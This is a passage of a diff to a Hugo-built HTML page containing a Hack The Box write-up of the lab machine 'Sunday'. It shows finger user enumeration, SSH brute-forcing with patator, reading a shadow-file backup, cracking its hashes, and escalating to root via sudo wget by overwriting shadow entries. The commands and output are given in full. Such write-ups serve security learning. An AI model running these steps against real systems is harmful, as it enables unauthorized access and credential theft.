@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.64.1" />
+    <meta name="generator" content="Hugo 0.101.0" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hack The Box Write-up - Sunday | text/plain</title>
@@ -31,10 +31,10 @@ Cracking a password hash from a shadow-file backup you find get&#39;s you to the
 other, from which you can escalate to root after realizing you can sudo wget.
 " />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://dominicbreuker.com/post/htb_sunday/" />
-<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/>
-<meta property="article:published_time" content="2018-09-30T00:00:00+02:00" />
-<meta property="article:modified_time" content="2018-09-30T00:00:00+02:00" />
+<meta property="og:url" content="https://dominicbreuker.com/post/htb_sunday/" /><meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2018-09-30T00:00:00+00:00" />
+<meta property="article:modified_time" content="2018-09-30T00:00:00+00:00" />
+
 
     
 
@@ -45,6 +45,7 @@ other, from which you can escalate to root after realizing you can sudo wget.
 
     <meta name="theme-color" content="#000">
 
+    
     
     
     
@@ -219,7 +220,7 @@ figure a:hover {
     
       <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
     
-      <a itemprop="url" class="active" href="/post/"><span itemprop="name">Post</span></a>
+      <a itemprop="url" class="" href="/post/"><span itemprop="name">Post</span></a>
     
       <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
     
@@ -236,14 +237,9 @@ finding some usernames. If you did thorough port scans and did not miss SSH on
 a non-standard port, one of these names allow you to brute-force your way into the box.
 Cracking a password hash from a shadow-file backup you find get&#39;s you to the
 other, from which you can escalate to root after realizing you can sudo wget.
-">
-<meta itemprop="datePublished" content="2018-09-30T00:00:00&#43;02:00" />
-<meta itemprop="dateModified" content="2018-09-30T00:00:00&#43;02:00" />
-<meta itemprop="wordCount" content="1675">
-<meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
-
-
-
+"><meta itemprop="datePublished" content="2018-09-30T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2018-09-30T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1675"><meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 <meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up," />
     <script async src="/js/baffle.js"></script>
     <header>
@@ -258,7 +254,7 @@ other, from which you can escalate to root after realizing you can sudo wget.
   <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
 </svg>
 
-  Published: <time datetime="2018-09-30T00:00:00&#43;02:00">30 Sep, 2018</time>
+  Published: <time datetime="2018-09-30T00:00:00&#43;00:00">30 Sep, 2018</time>
 
 
       </p>
@@ -316,33 +312,33 @@ Never worked with this OS before, so I was keen to see what I would find.</p>
 <p>To start, we quickly scan the ports of the box.
 An initial scan with high rate using <code>masscan</code> takes only a few seconds and
 reveals a few open ports:</p>
-<pre><code class="language-console" data-lang="console"> $ masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.76
-...
-Discovered open port 111/tcp on 10.10.10.76
-Discovered open port 42492/tcp on 10.10.10.76
-Discovered open port 62177/tcp on 10.10.10.76
-Discovered open port 22022/tcp on 10.10.10.76
-Discovered open port 79/tcp on 10.10.10.76
-...
-</code></pre><p>Had we scanned with <code>nmap</code> initially, we would either miss the high
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.76
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Discovered open port 111/tcp on 10.10.10.76
+</span></span><span style="display:flex;"><span>Discovered open port 42492/tcp on 10.10.10.76
+</span></span><span style="display:flex;"><span>Discovered open port 62177/tcp on 10.10.10.76
+</span></span><span style="display:flex;"><span>Discovered open port 22022/tcp on 10.10.10.76
+</span></span><span style="display:flex;"><span>Discovered open port 79/tcp on 10.10.10.76
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Had we scanned with <code>nmap</code> initially, we would either miss the high
 non-standard ports or the scan would take very long. <code>masscan</code> is much faster.
 Only for all open ports we follow up with a more thorough <code>nmap</code> scan:</p>
-<pre><code class="language-console" data-lang="console"> $ nmap -sV -sC -p 111,42492,62177,22022,79 10.10.10.76
-...
-PORT      STATE SERVICE   VERSION
-79/tcp    open  finger    Sun Solaris fingerd
-|_finger: No one logged on\x0D
-111/tcp   open  rpcbind   2-4 (RPC #100000)
-Connection closed by foreign host.
-22022/tcp open  ssh       SunSSH 1.3 (protocol 2.0)
-| ssh-hostkey:
-|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
-|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
-42492/tcp open  unknown
-62177/tcp open  smserverd 1 (RPC #100155)
-Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
-...
-</code></pre><p>We find a Solaris machine, as promised by the HackTheBox
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ nmap -sV -sC -p 111,42492,62177,22022,79 10.10.10.76
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE   VERSION
+</span></span><span style="display:flex;"><span>79/tcp    open  finger    Sun Solaris fingerd
+</span></span><span style="display:flex;"><span>|_finger: No one logged on\x0D
+</span></span><span style="display:flex;"><span>111/tcp   open  rpcbind   2-4 (RPC #100000)
+</span></span><span style="display:flex;"><span>Connection closed by foreign host.
+</span></span><span style="display:flex;"><span>22022/tcp open  ssh       SunSSH 1.3 (protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
+</span></span><span style="display:flex;"><span>|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
+</span></span><span style="display:flex;"><span>42492/tcp open  unknown
+</span></span><span style="display:flex;"><span>62177/tcp open  smserverd 1 (RPC #100155)
+</span></span><span style="display:flex;"><span>Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>We find a Solaris machine, as promised by the HackTheBox
 <a href="hackthebox.eu/home/machines/list">machine list</a>.
 We also see a few interesting services like finger and rcpbind, which suggests
 there might be NFS shares.
@@ -359,99 +355,99 @@ and allows enumeration of system users with word lists.</p>
 <p>To query information, use the <code>finger</code> tool, which is the client for <code>fingerd</code>.
 Give it a username and host and it will either output information if that user
 exists, or &ldquo;???&rdquo; if it does not:</p>
-<pre><code class="language-console" data-lang="console"> $ finger -ls root@10.10.10.76
-Login name: root                        In real life: Super-User
-Directory: /root                        Shell: /usr/bin/bash
-Last login Thu Sep 13 20:42 on pts/3 from sunday
-Mail last read Thu Sep 13 20:45:34 2018
-No Plan.
-
- $ finger -ls non-existing-user@10.10.10.76
-Login name: non-existing-user                   In real life: ???
-</code></pre><p>The same can be achieved without <code>finger</code> just by using plain old <code>telnet</code>:</p>
-<pre><code class="language-console" data-lang="console"> $ telnet 10.10.10.76 79
-Trying 10.10.10.76...
-Connected to 10.10.10.76.
-Escape character is '^]'.
-root
-Login       Name               TTY         Idle    When    Where
-root     Super-User            pts/3        &lt;Apr 24 10:37&gt; sunday
-
- $ telnet 10.10.10.76 79
-Trying 10.10.10.76...
-Connected to 10.10.10.76.
-Escape character is '^]'.
-non-existing-user
-Login       Name               TTY         Idle    When    Where
-non-existing-user       ???
-Connection closed by foreign host.
-</code></pre><p>Some information on users that should exist on the box by default can be found
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ finger -ls root@10.10.10.76
+</span></span><span style="display:flex;"><span>Login name: root                        In real life: Super-User
+</span></span><span style="display:flex;"><span>Directory: /root                        Shell: /usr/bin/bash
+</span></span><span style="display:flex;"><span>Last login Thu Sep 13 20:42 on pts/3 from sunday
+</span></span><span style="display:flex;"><span>Mail last read Thu Sep 13 20:45:34 2018
+</span></span><span style="display:flex;"><span>No Plan.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> $ finger -ls non-existing-user@10.10.10.76
+</span></span><span style="display:flex;"><span>Login name: non-existing-user                   In real life: ???
+</span></span></code></pre></div><p>The same can be achieved without <code>finger</code> just by using plain old <code>telnet</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ telnet 10.10.10.76 79
+</span></span><span style="display:flex;"><span>Trying 10.10.10.76...
+</span></span><span style="display:flex;"><span>Connected to 10.10.10.76.
+</span></span><span style="display:flex;"><span>Escape character is &#39;^]&#39;.
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>Login       Name               TTY         Idle    When    Where
+</span></span><span style="display:flex;"><span>root     Super-User            pts/3        &lt;Apr 24 10:37&gt; sunday
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> $ telnet 10.10.10.76 79
+</span></span><span style="display:flex;"><span>Trying 10.10.10.76...
+</span></span><span style="display:flex;"><span>Connected to 10.10.10.76.
+</span></span><span style="display:flex;"><span>Escape character is &#39;^]&#39;.
+</span></span><span style="display:flex;"><span>non-existing-user
+</span></span><span style="display:flex;"><span>Login       Name               TTY         Idle    When    Where
+</span></span><span style="display:flex;"><span>non-existing-user       ???
+</span></span><span style="display:flex;"><span>Connection closed by foreign host.
+</span></span></code></pre></div><p>Some information on users that should exist on the box by default can be found
 in the Oracle Solaris
 <a href="https://docs.oracle.com/cd/E36784_01/html/E36818/userconcept-20.html">documentation</a>.</p>
 <p>To find other users, we can enumerate finger with a username wordlist.
 A good list is in <a href="https://github.com/danielmiessler/SecLists">SecLists</a> at
 <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt">Usernames/Names/names.txt</a>.
 It has about 10k lines. A short Bash script will do the trick:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
-</span><span style="color:#75715e"></span>
-wordlist<span style="color:#f92672">=</span>/opt/SecLists/Usernames/Names/names.txt
-
-<span style="color:#66d9ef">while</span> read user; <span style="color:#66d9ef">do</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
-        <span style="color:#66d9ef">continue</span>
-    <span style="color:#66d9ef">fi</span>
-
-    result<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>finger $user@10.10.10.76<span style="color:#e6db74">`</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span><span style="color:#f92672">[</span> ! $result <span style="color:#f92672">=</span>~ ^.*<span style="color:#ae81ff">\?</span><span style="color:#ae81ff">\?</span><span style="color:#ae81ff">\?</span>.*$ <span style="color:#f92672">]</span><span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
-        echo <span style="color:#e6db74">&#34;### --- ###&#34;</span>
-        echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">User found: </span>$user<span style="color:#e6db74">&#34;</span>
-        echo <span style="color:#e6db74">&#34; --- Details:&#34;</span>
-        echo $result
-        echo <span style="color:#e6db74">&#34;&#34;</span>
-    <span style="color:#66d9ef">fi</span>
-<span style="color:#66d9ef">done</span> &lt; $wordlist
-</code></pre></div><p>Note that <code>fingerd</code> does not return information only on the user you request.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>wordlist<span style="color:#f92672">=</span>/opt/SecLists/Usernames/Names/names.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read user; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    result<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>finger $user@10.10.10.76<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! $result <span style="color:#f92672">=</span>~ ^.*<span style="color:#ae81ff">\?\?\?</span>.*$ <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;### --- ###&#34;</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;User found: </span>$user<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34; --- Details:&#34;</span>
+</span></span><span style="display:flex;"><span>        echo $result
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> &lt; $wordlist
+</span></span></code></pre></div><p>Note that <code>fingerd</code> does not return information only on the user you request.
 Rather, it will do some sort of full text search in the user information. For
 example, it will return information on &ldquo;nobody4&rdquo; when querying for &ldquo;user&rdquo; since
 the real name of &ldquo;nobody4&rdquo; is &ldquo;SunOS 4.x NFS Anonymous Access User&rdquo;. You could
 disable this behaviour with a flag, but ouch chances of discovering users would
 only get lower.</p>
 <p>The script runs for a while and provides us with two interesting usernames:</p>
-<pre><code class="language-console" data-lang="console"> $ ./finger_enum.sh
-...
-### --- ###
-User found: sammy
- --- Details:
-Login Name TTY Idle When Where sammy sammy pts/3 &lt;Sep 13 20:40&gt; 10.10.15.130
-
-...
-### --- ###
-User found: sunny
- --- Details:
-Login Name TTY Idle When Where sunny sunny pts/3 &lt;Apr 24 10:48&gt; 10.10.14.4
-
-...
-</code></pre><h1 id="breaking-in">Breaking in</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ ./finger_enum.sh
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>#<span style="color:#75715e">## --- ###</span>
+</span></span><span style="display:flex;"><span>User found: sammy
+</span></span><span style="display:flex;"><span> --- Details:
+</span></span><span style="display:flex;"><span>Login Name TTY Idle When Where sammy sammy pts/3 &lt;Sep 13 20:40&gt; 10.10.15.130
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>...
+</span></span><span style="display:flex;"><span>#<span style="color:#75715e">## --- ###</span>
+</span></span><span style="display:flex;"><span>User found: sunny
+</span></span><span style="display:flex;"><span> --- Details:
+</span></span><span style="display:flex;"><span>Login Name TTY Idle When Where sunny sunny pts/3 &lt;Apr 24 10:48&gt; 10.10.14.4
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>...
+</span></span></code></pre></div><h1 id="breaking-in">Breaking in</h1>
 <h2 id="ssh-password-guessing">SSH password guessing</h2>
 <p>Knowing some usernames, we can go on trying to log into the system.
 For each user, try a few obvious things related to the sun or to Sunday.
 My short list of passwords was:</p>
-<pre><code class="language-console" data-lang="console">admin
-password
-123456
-sunny
-sun
-sunshine
-sunlight
-sunday
-monday
-tuesday
-wednesday
-thursday
-friday
-saturday
-weekend
-</code></pre><p>Putting usernames into a file &ldquo;usernames.txt&rdquo; and the list above into
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>admin
+</span></span><span style="display:flex;"><span>password
+</span></span><span style="display:flex;"><span>123456
+</span></span><span style="display:flex;"><span>sunny
+</span></span><span style="display:flex;"><span>sun
+</span></span><span style="display:flex;"><span>sunshine
+</span></span><span style="display:flex;"><span>sunlight
+</span></span><span style="display:flex;"><span>sunday
+</span></span><span style="display:flex;"><span>monday
+</span></span><span style="display:flex;"><span>tuesday
+</span></span><span style="display:flex;"><span>wednesday
+</span></span><span style="display:flex;"><span>thursday
+</span></span><span style="display:flex;"><span>friday
+</span></span><span style="display:flex;"><span>saturday
+</span></span><span style="display:flex;"><span>weekend
+</span></span></code></pre></div><p>Putting usernames into a file &ldquo;usernames.txt&rdquo; and the list above into
 &ldquo;passwords.txt&rdquo;, we can brute force our way in.
 You could try brute-forcing SSH with <a href="https://sectools.org/tool/hydra/">Hydra</a>,
 but for some reason it does not work. After some desperate hours, I&rsquo;ve discovered
@@ -459,78 +455,78 @@ but for some reason it does not work. After some desperate hours, I&rsquo;ve dis
 it since then, since it feels more reliable. It can be used on many different services
 including SSH and is very easy to use. Getting into SSH on this box works like
 so:</p>
-<pre><code class="language-console" data-lang="console"> $ ./patator.py ssh_login host=10.10.10.76 port=22022 user=FILE0 0=/htb/sunday/usernames.txt password=FILE1 1=/htb/sunday/passwords.txt
-13:40:08 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-09-15 13:40 EDT
-13:40:08 patator    INFO -
-13:40:08 patator    INFO - code  size    time | candidate                          |   num | mesg
-13:40:08 patator    INFO - -----------------------------------------------------------------------------
-...
-13:40:10 patator    INFO - 1     22     0.164 | sunny:weekend                      |    15 | Authentication failed.
-13:40:11 patator    INFO - 0     19     0.301 | sunny:sunday                       |     8 | SSH-2.0-Sun_SSH_1.3
-13:40:11 patator    INFO - 1     22     0.264 | sunny:sunlight                     |     7 | Authentication failed.
-...
-13:40:13 patator    INFO - Hits/Done/Skip/Fail/Size: 30/30/0/0/30, Avg: 5 r/s, Time: 0h 0m 5s
-</code></pre><p>All requests return &ldquo;Authentication failed.&rdquo; except for credentials &ldquo;sunny&rdquo; /
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ ./patator.py ssh_login host=10.10.10.76 port=22022 user=FILE0 0=/htb/sunday/usernames.txt password=FILE1 1=/htb/sunday/passwords.txt
+</span></span><span style="display:flex;"><span>13:40:08 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-09-15 13:40 EDT
+</span></span><span style="display:flex;"><span>13:40:08 patator    INFO -
+</span></span><span style="display:flex;"><span>13:40:08 patator    INFO - code  size    time | candidate                          |   num | mesg
+</span></span><span style="display:flex;"><span>13:40:08 patator    INFO - -----------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>13:40:10 patator    INFO - 1     22     0.164 | sunny:weekend                      |    15 | Authentication failed.
+</span></span><span style="display:flex;"><span>13:40:11 patator    INFO - 0     19     0.301 | sunny:sunday                       |     8 | SSH-2.0-Sun_SSH_1.3
+</span></span><span style="display:flex;"><span>13:40:11 patator    INFO - 1     22     0.264 | sunny:sunlight                     |     7 | Authentication failed.
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>13:40:13 patator    INFO - Hits/Done/Skip/Fail/Size: 30/30/0/0/30, Avg: 5 r/s, Time: 0h 0m 5s
+</span></span></code></pre></div><p>All requests return &ldquo;Authentication failed.&rdquo; except for credentials &ldquo;sunny&rdquo; /
 &ldquo;sunday&rdquo;, which give &ldquo;SSH-2.0-Sun_SSH_1.3&rdquo;. This means we found valid login
 credentials.</p>
 <h1 id="from-sunny-to-sammy">From sunny to sammy</h1>
 <p>We can use our newly found credentials to log in via SSH:</p>
-<pre><code class="language-console" data-lang="console"> $ ssh -p 22022 sunny@10.10.10.76
-Password:
-Last login: Wed Sep 12 20:57:00 2018 from 10.10.15.130
-Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
-sunny@sunday:~$
-</code></pre><p>Starting from here, we could proceed with any of the standard Linux privilege
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ ssh -p 22022 sunny@10.10.10.76
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span>Last login: Wed Sep 12 20:57:00 2018 from 10.10.15.130
+</span></span><span style="display:flex;"><span>Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
+</span></span><span style="display:flex;"><span>sunny@sunday:~$
+</span></span></code></pre></div><p>Starting from here, we could proceed with any of the standard Linux privilege
 escalation scripts. It would likely break for some parts though since Solaris
 is not exactly like Linux, which is why I proceeded with poking around manually
 to start.</p>
 <h2 id="rabbit-hole">Rabbit hole</h2>
 <p>An easy thing to find is that sunny has sudo execution rights on &ldquo;/root/troll&rdquo;:</p>
-<pre><code class="language-console" data-lang="console">sunny@sunday:~$ sudo -l
-User sunny may run the following commands on this host:
-    (root) NOPASSWD: /root/troll
-
-sunny@sunday:~$ sudo /root/troll
-testing
-uid=0(root) gid=0(root)
-</code></pre><p>It seems to just print &ldquo;testing&rdquo; and then run <code>id</code>. I did not investigate
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>sunny@sunday:~$ sudo -l
+</span></span><span style="display:flex;"><span>User sunny may run the following commands on this host:
+</span></span><span style="display:flex;"><span>    (root) NOPASSWD: /root/troll
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>sunny@sunday:~$ sudo /root/troll
+</span></span><span style="display:flex;"><span>testing
+</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root)
+</span></span></code></pre></div><p>It seems to just print &ldquo;testing&rdquo; and then run <code>id</code>. I did not investigate
 further as the name suggests we won&rsquo;t find anything useful.</p>
 <h2 id="cracking-sammys-password">Cracking sammy&rsquo;s password</h2>
 <p>Instead, look around further and you find a strange folder &ldquo;/backup&rdquo; with a
 file named &ldquo;shadow.backup&rdquo; inside. The content looks like it really is a
 backup of &ldquo;/etc/shadow&rdquo;:</p>
-<pre><code class="language-console" data-lang="console">sunny@sunday:/$ cat /backup/shadow.backup
-...
-sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
-sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
-</code></pre><p>There are two SHA256 password hashes for users sammy and sunny. We know they are
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>sunny@sunday:/$ cat /backup/shadow.backup
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+</span></span><span style="display:flex;"><span>sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+</span></span></code></pre></div><p>There are two SHA256 password hashes for users sammy and sunny. We know they are
 SHA256 hashes as they start with &ldquo;$5$&rdquo; (check <a href="https://www.cyberciti.biz/faq/understanding-etcshadow-file/">this page</a>
 for how to read shadow files). Assuming the file contains the current
 passwords, the one for &ldquo;sunny&rdquo; should be &ldquo;sunday&rdquo;. We can verify that by
 regenerating sunny&rsquo;s password hash with the salt &ldquo;iRMbpnBv&rdquo; found in
 the backed-up shadow file:</p>
-<pre><code class="language-console" data-lang="console"> $ mkpasswd -m sha-256 -S iRMbpnBv sunday
-$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3
-</code></pre><p>They match. Let&rsquo;s crack sammy&rsquo;s password and hope that it is also still in use.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ mkpasswd -m sha-256 -S iRMbpnBv sunday
+</span></span><span style="display:flex;"><span>$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3
+</span></span></code></pre></div><p>They match. Let&rsquo;s crack sammy&rsquo;s password and hope that it is also still in use.
 Put the password hash &ldquo;$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB&rdquo;
 into a file &ldquo;sammy-hash.txt&rdquo; and run (jumbo)john against the &ldquo;rockyou&rdquo; wordlist:</p>
-<pre><code class="language-console" data-lang="console"> $ john ./sammy-hash.txt  --wordlist=/usr/share/wordlists/rockyou.txt
-Using default input encoding: UTF-8
-Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
-Cost 1 (iteration count) is 5000 for all loaded hashes
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-cooldude!        (?)
-...
-</code></pre><p>It discovers the format automatically and returns the password after a short
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ john ./sammy-hash.txt  --wordlist=/usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
+</span></span><span style="display:flex;"><span>Cost 1 (iteration count) is 5000 for all loaded hashes
+</span></span><span style="display:flex;"><span>Will run 4 OpenMP threads
+</span></span><span style="display:flex;"><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span style="display:flex;"><span>cooldude!        (?)
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>It discovers the format automatically and returns the password after a short
 time. The password is &ldquo;cooldude!&rdquo;</p>
 <h1 id="from-sammy-to-root">From sammy to root</h1>
-<p>With out new credentials &ldquo;sammy&rdquo; / &ldquo;cooldude!&quot;, we can open a new SSH session.
+<p>With out new credentials &ldquo;sammy&rdquo; / &ldquo;cooldude!&rdquo;, we can open a new SSH session.
 Remember that sunny was able to run sudo? What about sammy?</p>
-<pre><code class="language-console" data-lang="console">sammy@sunday:~$ sudo -l
-User sammy may run the following commands on this host:
-    (root) NOPASSWD: /usr/bin/wget
-</code></pre><p>This is a lot more interesting that the &ldquo;troll&rdquo; thing. With <code>wget -O</code> we can
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>sammy@sunday:~$ sudo -l
+</span></span><span style="display:flex;"><span>User sammy may run the following commands on this host:
+</span></span><span style="display:flex;"><span>    (root) NOPASSWD: /usr/bin/wget
+</span></span></code></pre></div><p>This is a lot more interesting that the &ldquo;troll&rdquo; thing. With <code>wget -O</code> we can
 download a file and specify a location to write it to. As root, we can
 overwrite pretty much any configuration file. Thus, lot&rsquo;s of different ways to
 get into root exist from here. You could overwrite <code>wget</code> with <code>bash</code>, then run
@@ -540,30 +536,30 @@ Probably many more ways exist.</p>
 <p>To not destroy the experience of other players, use a non-destructive method.
 I just prepended a line to the backup of &ldquo;etc/shadow&rdquo; to reuse the password
 &ldquo;sunday&rdquo; of sunny for root:</p>
-<pre><code class="language-console" data-lang="console">root:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
-mysql:NP:::::::
-openldap:*LK*:::::::
-webservd:*LK*:::::::
-postgres:NP:::::::
-svctag:*LK*:6445::::::
-nobody:*LK*:6445::::::
-noaccess:*LK*:6445::::::
